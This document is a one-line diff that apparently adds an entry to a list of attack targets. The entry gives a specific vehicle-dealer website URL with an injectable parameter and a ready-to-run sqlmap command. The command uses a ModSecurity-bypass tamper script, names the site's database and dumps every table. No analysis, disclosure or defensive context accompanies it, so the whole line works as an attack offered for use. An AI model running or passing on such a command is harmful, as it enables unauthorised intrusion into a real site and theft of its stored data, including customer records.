@@ -1,0 +1,1 @@
+https://www.bjveiculos.com.br/?ver=veiculo-detalhe&cod=4883 (GET)  # sqlmap.py --tamper modsecurityzeroversioned -u https://www.bjveiculos.com.br/?ver=veiculo-detalhe&cod=4883 -D bjveis_bjveic --tables --dump-all --threads 5 -v3
